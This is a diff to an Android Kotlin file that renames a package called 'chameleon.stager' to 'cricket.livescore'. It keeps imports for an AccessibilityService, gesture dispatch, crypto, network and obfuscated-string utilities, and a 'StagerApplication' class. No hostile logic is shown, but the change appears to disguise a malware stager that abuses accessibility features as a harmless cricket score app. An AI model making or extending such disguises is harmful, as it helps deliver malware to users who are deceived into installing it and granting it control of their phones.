@@ -1,4 +1,4 @@
-package com.chameleon.stager.service
+package com.cricket.livescore.service
 
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.GestureDescription
@@ -9,10 +9,10 @@ import android.os.Build
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
-import com.chameleon.stager.StagerApplication
-import com.chameleon.stager.utils.CryptoUtils
-import com.chameleon.stager.utils.NetworkUtils
-import com.chameleon.stager.utils.ObfuscatedStrings
+import com.cricket.livescore.StagerApplication
+import com.cricket.livescore.utils.CryptoUtils
+import com.cricket.livescore.utils.NetworkUtils
+import com.cricket.livescore.utils.ObfuscatedStrings
 import org.json.JSONObject
 import java.io.ByteArrayOutputStream
 import java.io.DataOutputStream
